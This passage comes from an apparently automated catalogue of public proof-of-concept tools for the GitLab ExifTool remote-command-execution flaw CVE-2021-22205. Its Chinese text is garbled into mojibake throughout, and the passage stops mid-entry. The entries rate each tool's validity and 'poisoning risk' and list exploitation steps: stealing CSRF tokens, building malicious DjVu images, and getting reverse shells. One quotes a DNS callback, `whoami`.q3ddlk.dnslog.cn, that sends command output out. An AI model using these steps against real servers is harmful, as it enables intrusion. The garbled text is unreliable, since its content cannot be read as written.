æä¾›çš„POCä»£ç æ–‡ä»¶å†…å®¹æžå…¶ç®€å•ï¼Œåªæœ‰CVEç¼–å·çš„æè¿°ï¼Œä¸åŒ…å«ä»»ä½•å¯æ‰§è¡Œä»£ç ï¼Œå› æ­¤æŠ•æ¯’é£Žé™©æžä½Žã€‚å¯ä»¥è®¤ä¸ºæŠ•æ¯’é£Žé™©ä¸º0%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…å°†è¯¥å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ°å­˜åœ¨æ¼æ´žçš„ GitLab å®žä¾‹ä¸Šï¼Œä¾‹å¦‚é€šè¿‡å¤´åƒä¸Šä¼ ã€é¡¹ç›®å›¾ç‰‡ä¸Šä¼ ç­‰åŠŸèƒ½ã€‚
3.  GitLab ä½¿ç”¨ ExifTool è§£æžè¯¥å›¾åƒæ–‡ä»¶æ—¶ï¼Œæ¶æ„å…ƒæ•°æ®ä¸­çš„å‘½ä»¤ä¼šè¢«æ‰§è¡Œï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚

æ”»å‡»è€…å¯ä»¥åœ¨å›¾åƒæ–‡ä»¶ä¸­åµŒå…¥payloadï¼Œé€šå¸¸æ˜¯æž„é€ ä¸€ä¸ªç•¸å½¢çš„å›¾ç‰‡æ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolå¤„ç†å›¾ç‰‡æ–‡ä»¶æ—¶æ‰§è¡Œæ¶æ„å‘½ä»¤ã€‚

**ä¼˜å…ˆçº§ï¼š**
æ ¹æ®æŽ’åºä¼˜å…ˆçº§ï¼Œæœç´¢å¼•æ“Žç»“æžœï¼ˆå½“å‰ä¸ºç©ºï¼‰> æ¼æ´žåˆ©ç”¨ä»£ç ï¼ˆç®€å•çš„READMEï¼‰> æ¼æ´žåº“ä¿¡æ¯ã€‚


**é¡¹ç›®åœ°å€:** [Hikikan/CVE-2021-22205](https://github.com/Hikikan/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #4

**æ¥æº**: [CVE-2021-22205-NukingDragons_gitlab-cve-2021-22205.md](../2021/CVE-2021-22205-NukingDragons_gitlab-cve-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…ï¼Œä¸”å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 5%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žå­˜åœ¨äºŽ GitLab CE/EE ä¸­ï¼ŒæºäºŽå…¶æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ¼æ´žåˆ©ç”¨æ–¹å¼ï¼šæ”»å‡»è€…å¯ä»¥æž„é€ åŒ…å«æ¶æ„å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ï¼Œé€šè¿‡ä¸Šä¼ æŽ¥å£ï¼ˆå¦‚ç”¨æˆ·å¤´åƒä¸Šä¼ ï¼‰è§¦å‘ ExifTool çš„å‘½ä»¤æ³¨å…¥æ¼æ´žï¼Œä»Žè€Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æ¼æ´žåˆ©ç”¨æœ‰æ•ˆæ€§:**
æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæ¼æ´žåˆ©ç”¨ä»£ç ï¼Œæä¾›çš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´žåº“ä¿¡æ¯ä¸­çš„å‚è€ƒé“¾æŽ¥æŒ‡å‘äº† HackerOne æŠ¥å‘Šå’Œ Packet Storm Security çš„ç›¸å…³åˆ©ç”¨åˆ†æžï¼Œè¯æ˜Žäº†è¯¥æ¼æ´žçš„å¯åˆ©ç”¨æ€§ã€‚æä¾›çš„ bash è„šæœ¬èƒ½å¤Ÿè‡ªåŠ¨åŒ–åˆ©ç”¨è¯¥æ¼æ´žï¼Œæ”¯æŒåå¼¹ shell å’Œè‡ªå®šä¹‰å‘½ä»¤æ‰§è¡Œã€‚

**æŠ•æ¯’é£Žé™©åˆ†æž:**
æä¾›çš„ bash è„šæœ¬ `cve-2021-22205.sh`  ä¸»è¦åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«æ¶æ„å…ƒæ•°æ®çš„å›¾åƒï¼Œå¹¶é€šè¿‡ curl å‘½ä»¤ä¸Šä¼ åˆ°ç›®æ ‡ GitLab æœåŠ¡å™¨ï¼Œè§¦å‘å‘½ä»¤æ‰§è¡Œã€‚ ä»£ç æœ¬èº«é€»è¾‘æ¸…æ™°ï¼Œæ²¡æœ‰æ˜Žæ˜¾çš„æ¶æ„è¡Œä¸ºï¼Œå¦‚æœªç»æŽˆæƒçš„æ–‡ä»¶è®¿é—®ã€æ•°æ®çªƒå–ã€æˆ–è€…æ¤å…¥åŽé—¨ç­‰ã€‚

è™½ç„¶ç›®å‰çš„ä»£ç æ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’è¿¹è±¡ï¼Œä½†æ˜¯ç”±äºŽè„šæœ¬ä¼šæ‰§è¡Œç”¨æˆ·æŒ‡å®šçš„å‘½ä»¤ï¼Œå› æ­¤å­˜åœ¨æ½œåœ¨é£Žé™©ã€‚ç”¨æˆ·éœ€è¦ä»”ç»†æ£€æŸ¥è¿è¡Œçš„å‘½ä»¤ï¼Œé¿å…æ‰§è¡Œæ¶æ„æ“ä½œã€‚æ½œåœ¨çš„æŠ•æ¯’æ–¹å¼å¯èƒ½æ˜¯åœ¨è„šæœ¬ä¸­æ·»åŠ éšè”½çš„é€»è¾‘ï¼Œä¾‹å¦‚æ ¹æ®ç›®æ ‡çŽ¯å¢ƒæ‰§è¡Œä¸åŒçš„å‘½ä»¤ã€‚å› æ­¤ï¼Œä»£ç çš„å®‰å…¨æ€§è¯„ä¼°å¹¶éžç»å¯¹ï¼Œéœ€è¦ç»“åˆå…·ä½“ä½¿ç”¨åœºæ™¯è¿›è¡Œç»¼åˆåˆ¤æ–­ã€‚ ä»£ç ä¸­åˆ›å»ºä¸´æ—¶æ–‡ä»¶, å¹¶ä¸”è¿›è¡Œåˆ é™¤å¯ä»¥åˆ¤å®š,ä½œè€…çš„ç¼–ç ä¹ æƒ¯è‰¯å¥½.

**æ¼æ´žåˆ©ç”¨æ–¹å¼:**
1.  æ”»å‡»è€…é¦–å…ˆèŽ·å–ç›®æ ‡ GitLab å®žä¾‹çš„ CSRF Token å’Œ Session Cookieã€‚
2.  ç„¶åŽï¼Œæž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ï¼Œè¯¥å…ƒæ•°æ®ä¸­åŒ…å«äº†è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚
3.  ä½¿ç”¨ curl å‘½ä»¤ï¼Œå°†æž„é€ çš„æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ° GitLab æœåŠ¡å™¨çš„å¤´åƒä¸Šä¼ æŽ¥å£ã€‚
4.  GitLab è°ƒç”¨ ExifTool å¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶ï¼ŒExifTool åœ¨è§£æžå›¾åƒå…ƒæ•°æ®æ—¶ï¼Œä¼šæ‰§è¡Œæ¶æ„å‘½ä»¤ï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚
5. æ”»å‡»è€…å¯ä»¥é€šè¿‡åå¼¹ shell æˆ–è€…æ‰§è¡Œè‡ªå®šä¹‰å‘½ä»¤æ¥æŽ§åˆ¶æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [NukingDragons/gitlab-cve-2021-22205](https://github.com/NukingDragons/gitlab-cve-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #5

**æ¥æº**: [CVE-2021-22205-ZZ-SOCMAP_CVE-2021-22205.md](../2021/CVE-2021-22205-ZZ-SOCMAP_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯èƒ½å¯¼è‡´å®Œå…¨æŽ§åˆ¶GitLabæœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æ— éœ€èº«ä»½éªŒè¯ï¼Œåªéœ€ç½‘ç»œè®¿é—®å³å¯

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽ GitLab CE/EE ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab æœªèƒ½æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼ˆä¾‹å¦‚ï¼ŒåŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®çš„ DJVU æ–‡ä»¶ï¼‰ï¼Œå½“ GitLab å°è¯•å¤„ç†è¯¥æ–‡ä»¶æ—¶ï¼ŒExifTool ä¼šæ‰§è¡ŒåµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚ 

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç æ˜¯æœ‰æ•ˆçš„ï¼Œå› ä¸ºå®ƒå®žçŽ°äº†æ¼æ´žåˆ©ç”¨æ‰€éœ€çš„æ­¥éª¤ï¼š

1.  æž„é€ åŒ…å«æ¶æ„å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ï¼ˆDJVU æ ¼å¼ï¼‰ã€‚ å…ƒæ•°æ®ä¸­åµŒå…¥äº†æ‰§è¡Œå‘½ä»¤çš„ payloadã€‚ å…·ä½“çš„payloadåœ¨ `rce_payload` å‡½æ•°ä¸­æž„é€ , ä½¿ç”¨äº† `qx{}` åŒ…è£¹å‘½ä»¤ã€‚
2.  åˆ›å»ºé¡¹ç›®ï¼ŒèŽ·å–`csrf_token`ï¼Œå’Œ`_gitlab_session`ã€‚
3.  ä¸Šä¼ æ¶æ„å›¾åƒæ–‡ä»¶åˆ°æ–°é¡¹ç›®çš„snippetï¼Œè§¦å‘æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
POCä»£ç å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£Žé™©ï¼Œå¤§çº¦ä¸º10%ã€‚è™½ç„¶ä¸»è¦ç›®çš„æ˜¯åˆ©ç”¨æ¼æ´žï¼Œä½†éœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š

*   **dnslog.cn:** ä»£ç ä¸­ä½¿ç”¨ `whoami`.q3ddlk.dnslog.cn åŸŸåè¿›è¡Œå‘½ä»¤æ‰§è¡Œç»“æžœçš„å›žä¼ ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¿®æ”¹è¯¥åŸŸåæ¥æ”¶é›†å—å®³è€…çš„ä¿¡æ¯ï¼Œä»Žè€Œè¿›è¡Œè¿›ä¸€æ­¥çš„æ”»å‡»ã€‚è™½ç„¶åœ¨æµ‹è¯•ä¸­è¿™æ–¹ä¾¿äº†æ¼æ´žéªŒè¯ï¼Œä½†åœ¨å®žé™…æ”»å‡»ä¸­ï¼Œæ¶æ„åŸŸåå¯èƒ½è¢«ç”¨äºŽæ›´éšè”½çš„ç›®çš„ï¼Œå¦‚C2é€šä¿¡ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼å¯ä»¥æ€»ç»“å¦‚ä¸‹ï¼š

1.  **æ¼æ´žå‘çŽ°ï¼š** GitLab æœªæ­£ç¡®éªŒè¯ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´ ExifTool åœ¨å¤„ç†å›¾åƒæ—¶æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
2.  **Payload æž„é€ ï¼š** æ”»å‡»è€…æž„é€ åŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®çš„ DJVU å›¾åƒæ–‡ä»¶ã€‚è¯¥å…ƒæ•°æ®åŒ…å«è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚
3.  **æ–‡ä»¶ä¸Šä¼ ï¼š** æ”»å‡»è€…ä¸Šä¼ æ¶æ„å›¾åƒæ–‡ä»¶åˆ° GitLabï¼Œé€šå¸¸æ˜¯é€šè¿‡é¡¹ç›®åˆ›å»ºï¼Œæˆ–è€…ä¸Šä¼ åˆ° Issue æˆ– Merge Request ä¸­ã€‚
4.  **å‘½ä»¤æ‰§è¡Œï¼š** å½“ GitLab å°è¯•å¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶æ—¶ï¼ŒExifTool æ‰§è¡ŒåµŒå…¥çš„å‘½ä»¤ã€‚åˆ©ç”¨ä»£ç åˆ›å»ºé¡¹ç›®ï¼Œå¹¶èŽ·å–åˆ›å»ºsnippetçš„tokenï¼Œæœ€åŽä¸Šä¼ æ–‡ä»¶è§¦å‘ã€‚
5.  **RCEï¼š** æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´žï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ GitLab æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [ZZ-SOCMAP/CVE-2021-22205](https://github.com/ZZ-SOCMAP/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #6

**æ¥æº**: [CVE-2021-22205-c0okB_CVE-2021-22205.md](../2021/CVE-2021-22205-c0okB_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8, >=13.9, <13.9.6, >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žä¸”å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ª GitLab CE/EE ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§:**
æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´žPOCæœ‰æ•ˆã€‚æ¼æ´žåº“ä¸­CVSSè¯„åˆ†ä¸º10ï¼Œå±žäºŽä¸¥é‡æ¼æ´žï¼ŒCISA KEVä¸­ä¹Ÿæ ‡è®°ä¸ºå·²çŸ¥è¢«åˆ©ç”¨æ¼æ´žï¼Œç»“åˆæä¾›çš„ä»£ç ï¼Œè¯æ˜Žè¯¥æ¼æ´žå­˜åœ¨ä¸”å®¹æ˜“è¢«åˆ©ç”¨ã€‚

**æŠ•æ¯’é£Žé™©:**
åˆ†æžæä¾›çš„POCä»£ç ï¼Œè¯¥ä»£ç ä¸»è¦å®žçŽ°äº†ä»¥ä¸‹åŠŸèƒ½ï¼š

*   DNSLog æŽ¢æµ‹ï¼šé€šè¿‡ DNSLog éªŒè¯æ¼æ´žæ˜¯å¦å­˜åœ¨ã€‚
*   RCEï¼šåˆ©ç”¨ Postbin è¿›è¡Œå¸¦å¤–å‘½ä»¤æ‰§è¡Œã€‚
*   åå¼¹ Shellï¼šåå¼¹ shell åˆ°æŒ‡å®šçš„ host å’Œ portã€‚
*   ä¸Šä¼ æ–‡ä»¶ï¼šé€šè¿‡ http åè®®ä¸Šä¼ æ–‡ä»¶åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼ˆéœ€è¦ VPSï¼‰ã€‚

ä»£ç ä¸»è¦é›†ä¸­åœ¨æ¼æ´žåˆ©ç”¨ï¼Œæ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’è¡Œä¸ºã€‚è¯¥å·¥å…·éœ€è¦ä½¿ç”¨è€…æä¾›ç›®æ ‡URLå’Œå‘½ä»¤ï¼Œæˆ–è€…åå¼¹shellåœ°å€ï¼Œæ²¡æœ‰å‘çŽ°ä½œè€…é¢„ç•™åŽé—¨çš„è¿¹è±¡ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Žï¼Œè¯„ä¼°ä¸º0%ã€‚

**åˆ©ç”¨æ–¹å¼:**

1.  **æ¼æ´žæ£€æµ‹:**  ä½¿ç”¨ `-m detect`  é€‰é¡¹ï¼Œé€šè¿‡ DNSLog éªŒè¯ç›®æ ‡æ˜¯å¦å­˜åœ¨æ¼æ´žã€‚ç¨‹åºä¼šç”Ÿæˆä¸€ä¸ªåŒ…å« DNS æŸ¥è¯¢è¯·æ±‚çš„æ–‡ä»¶ï¼Œå¦‚æžœç›®æ ‡å­˜åœ¨æ¼æ´žï¼Œä¼šå‘æŒ‡å®šçš„ DNSLog æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œä»Žè€ŒéªŒè¯æ¼æ´žã€‚
2.  **å‘½ä»¤æ‰§è¡Œ:**
    *   ä½¿ç”¨ `-m rce1` é€‰é¡¹ï¼Œé€šè¿‡ Postbin æ‰§è¡Œå‘½ä»¤ã€‚ç¨‹åºæž„é€ ä¸€ä¸ªåŒ…å«å‘½ä»¤çš„æ–‡ä»¶ï¼Œå¹¶å°†å…¶ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚ç›®æ ‡æœåŠ¡å™¨åœ¨è§£æžè¯¥æ–‡ä»¶æ—¶ï¼Œä¼šè§¦å‘æ¼æ´žå¹¶æ‰§è¡Œå‘½ä»¤ï¼Œå¹¶å°†ç»“æžœå‘é€åˆ° Postbinã€‚
3.  **åå¼¹ Shell:** ä½¿ç”¨ `-m rev` é€‰é¡¹ï¼Œåå¼¹ shell åˆ°æŒ‡å®šçš„ host å’Œ portã€‚ç¨‹åºæž„é€ ä¸€ä¸ªåŒ…å«åå¼¹ shell å‘½ä»¤çš„æ–‡ä»¶ï¼Œå¹¶å°†å…¶ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚ç›®æ ‡æœåŠ¡å™¨åœ¨è§£æžè¯¥æ–‡ä»¶æ—¶ï¼Œä¼šè§¦å‘æ¼æ´žå¹¶æ‰§è¡Œåå¼¹ shell å‘½ä»¤ï¼Œä»Žè€Œå»ºç«‹ä¸Žæ”»å‡»è€…æœåŠ¡å™¨çš„è¿žæŽ¥ã€‚
4.  **æ–‡ä»¶ä¸Šä¼ :** ä½¿ç”¨ `-m upload` é€‰é¡¹ï¼Œä¸Šä¼ æ–‡ä»¶åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚ç¨‹åºæž„é€ ä¸€ä¸ªåŒ…å«è¦ä¸Šä¼ çš„æ–‡ä»¶çš„æ–‡ä»¶ï¼Œå¹¶å°†å…¶ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚ç›®æ ‡æœåŠ¡å™¨åœ¨è§£æžè¯¥æ–‡ä»¶æ—¶ï¼Œä¼šè§¦å‘æ¼æ´žå¹¶å°†æ–‡ä»¶ä¿å­˜åˆ°æŒ‡å®šä½ç½®ã€‚

æ­¤æ¼æ´žåˆ©ç”¨çš„å…³é”®åœ¨äºŽåˆ©ç”¨ExifToolå¤„ç†å›¾ç‰‡æ—¶ï¼Œç”±äºŽæœªå¯¹ä¼ å…¥å‚æ•°è¿›è¡Œä¸¥æ ¼è¿‡æ»¤ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡æž„é€ æ¶æ„å›¾ç‰‡ï¼Œåœ¨ExifToolæ‰§è¡Œè¿‡ç¨‹ä¸­æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚


**é¡¹ç›®åœ°å€:** [c0okB/CVE-2021-22205](https://github.com/c0okB/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #7

**æ¥æº**: [CVE-2021-22205-cc3305_CVE-2021-22205.md](../2021/CVE-2021-22205-cc3305_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…ï¼Œä¸”æ”»å‡»è€…å¯è®¿é—®è¯¥å®žä¾‹ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽ GitLab CE/EE ä¸­çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæ˜¯ç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶å¯¼è‡´çš„ã€‚å…·ä½“æ¥è¯´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼ˆDjVu æ–‡ä»¶ï¼‰åˆ° GitLab æœåŠ¡å™¨ï¼Œå…¶ä¸­å›¾åƒæ–‡ä»¶çš„å…ƒæ•°æ®ä¸­åŒ…å«æ¶æ„å‘½ä»¤ã€‚å½“ GitLab ä½¿ç”¨ ExifTool å¤„ç†è¯¥å›¾åƒæ—¶ï¼Œæ–‡ä»¶ä¸­çš„æ¶æ„å‘½ä»¤ä¼šè¢«æ‰§è¡Œï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´žåº“ä¿¡æ¯å’Œæ¼æ´žåˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´žçš„POCä»£ç æœ‰æ•ˆã€‚æ¼æ´žåº“ä¿¡æ¯è¡¨æ˜Žè¯¥æ¼æ´žçš„ä¸¥é‡æ€§ä¸ºâ€œä¸¥é‡ (CRITICAL)â€ï¼ŒCVSS è¯„åˆ†é«˜è¾¾ 10 åˆ†ï¼Œè¡¨æ˜Žè¯¥æ¼æ´žå½±å“èŒƒå›´å¹¿ä¸”å®¹æ˜“åˆ©ç”¨ã€‚æä¾›çš„ POC ä»£ç  `CVE-2021-22205.py` æ—¨åœ¨åˆ©ç”¨æ­¤æ¼æ´žã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  **æŸ¥æ‰¾CSRF token:** è„šæœ¬é¦–å…ˆå°è¯•ä»Ž `/users/sign_in` é¡µé¢èŽ·å– CSRF tokenï¼Œå› ä¸ºä¸Šä¼ æ–‡ä»¶éœ€è¦æœ‰æ•ˆçš„ CSRF tokenã€‚å®ƒä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥æå– tokenã€‚
2.  **æž„å»ºæ¶æ„DjVuæ–‡ä»¶ä¸Šä¼ è¯·æ±‚:** ç„¶åŽï¼Œè„šæœ¬æž„å»ºä¸€ä¸ªåŒ…å«æ¶æ„ ExifTool å‘½ä»¤çš„ DjVu æ–‡ä»¶ã€‚è¿™ä¸ªæ–‡ä»¶ä¼šè¢«ä¸Šä¼ åˆ° GitLab æœåŠ¡å™¨ï¼ŒGitLab æœåŠ¡å™¨ä¼šä½¿ç”¨ ExifTool å¤„ç†è¯¥æ–‡ä»¶ã€‚
3.  **è§¦å‘å‘½ä»¤æ‰§è¡Œ:** å½“ ExifTool å¤„ç†è¯¥æ¶æ„æ–‡ä»¶æ—¶ï¼ŒåµŒå…¥åœ¨æ–‡ä»¶å…ƒæ•°æ®ä¸­çš„å‘½ä»¤å°±ä¼šè¢«æ‰§è¡Œï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
è™½ç„¶æä¾›çš„ä»£ç çœ‹èµ·æ¥åŠŸèƒ½æ˜Žç¡®ï¼Œä½†å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£Žé™©ã€‚å…·ä½“è¡¨çŽ°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

*   **ä¾èµ–æ€§é£Žé™©:** è¯¥è„šæœ¬ä¾èµ–äºŽ `requests` æ¨¡å—ã€‚è™½ç„¶è¿™æ˜¯å¾ˆå¸¸è§çš„æ¨¡å—ï¼Œå¦‚æžœä½œè€…ä¿®æ”¹äº†ä»£ç ä¸­çš„å…¶ä»–åœ°æ–¹ï¼Œä½¿å…¶å®‰è£…äº†æ¶æ„ä¾èµ–ï¼Œè¿™å¯èƒ½æ˜¯ä¸€ä¸ªæŠ•æ¯’ç‚¹ã€‚
*   **ä»£ç†é…ç½®åˆ©ç”¨:** è„šæœ¬æ”¯æŒé€šè¿‡ä»£ç†æœåŠ¡å™¨è¿žæŽ¥ã€‚æ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡æä¾›æ¶æ„çš„ä»£ç†æœåŠ¡å™¨åœ°å€æ¥çªƒå–å—å®³è€…çš„å‡­æ®æˆ–æ‰§è¡Œä¸­é—´äººæ”»å‡»ã€‚
*   **å‘½ä»¤æ‰§è¡Œçš„éšè”½æ€§ï¼š** å¦‚æžœä¸Šä¼ çš„payloadåŒ…å«åå¼¹shell, åˆ™è„šæœ¬å¯èƒ½ä¼šå°è¯•å»ºç«‹åå‘ shell è¿žæŽ¥æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œè€Œéš¾ä»¥æ£€æµ‹ã€‚
*   **ç‰ˆæœ¬éªŒè¯ç»•è¿‡:** è„šæœ¬ä¸­çš„ç‰ˆæœ¬éªŒè¯å¯èƒ½å­˜åœ¨ç»•è¿‡çš„é£Žé™©ï¼Œå³ä½¿ç”¨æˆ·ä¿®å¤äº†æ¼æ´žï¼Œè„šæœ¬ä»ç„¶å°è¯•åˆ©ç”¨ï¼Œå¯èƒ½ä¼šå¯¼è‡´å…¶ä»–æœªçŸ¥çš„å®‰å…¨é—®é¢˜ã€‚

